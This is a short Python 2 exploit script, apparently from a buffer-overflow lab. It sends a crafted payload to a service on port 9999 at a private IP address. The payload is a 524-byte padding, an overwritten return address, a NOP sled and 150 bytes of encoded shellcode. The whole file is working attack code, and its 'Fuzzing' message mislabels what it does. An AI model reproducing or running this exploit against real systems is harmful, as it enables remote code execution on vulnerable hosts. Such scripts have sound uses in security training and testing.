#!usr/bin/env python
import socket
import sys
#    Payload size: 150 bytes
#    Final size of python file: 824 bytes
shellcode =  ""
shellcode += "\xd9\xc4\xba\xeb\xa9\xdb\x95\xd9\x74\x24\xf4\x58"
shellcode += "\x29\xc9\xb1\x1f\x31\x50\x1a\x03\x50\x1a\x83\xe8"
shellcode += "\xfc\xe2\x1e\xc3\xd1\xcb\xd1\xcf\x11\x10\x42\xb3"
shellcode += "\x8e\xbd\x66\x83\x57\xcb\x87\x2e\x17\x5c\x1c\xd9"
shellcode += "\x12\x26\xa2\x7c\x4b\xaa\xa2\x6f\xd7\x23\x43\xe5"
shellcode += "\x81\x6b\xd3\xab\x1a\x05\x32\x08\x68\x95\x31\x4f"
shellcode += "\x0b\x8f\x77\x24\xd1\xc7\x25\xc4\x29\x18\x71\xaf"
shellcode += "\x29\x72\x84\xa6\xc9\xb3\x4f\x75\x8d\x31\x8f\xff"
shellcode += "\x33\xd2\x28\xb2\x4b\x9c\x36\xa2\x53\xde\xbf\x21"
shellcode += "\x92\x35\xb3\x64\xf6\xc6\x7b\x1b\x34\x56\xfe\x24"
shellcode += "\xbe\x47\x5b\x2c\xde\xf1\xed\x22\x91\x01\xdc\xbb"
shellcode += "\x54\xc5\xa6\xb9\xa9\x27\xee\xbf\x55\xa8\x0e\x7b"
shellcode += "\x54\xa8\x0e\x7b\x9a\x28"

buffer = ("A"*524)
eip_ptr = "\xf3\x12\x17\x31"
string = buffer+eip_ptr+("\x90"*20)+shellcode+("C"*(1000-524-4-20-len(shellcode)))

print "Fuzzing APP with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.69.0.104',9999))
s.recv(1024)
s.send(string + '\r\n')
s.close()
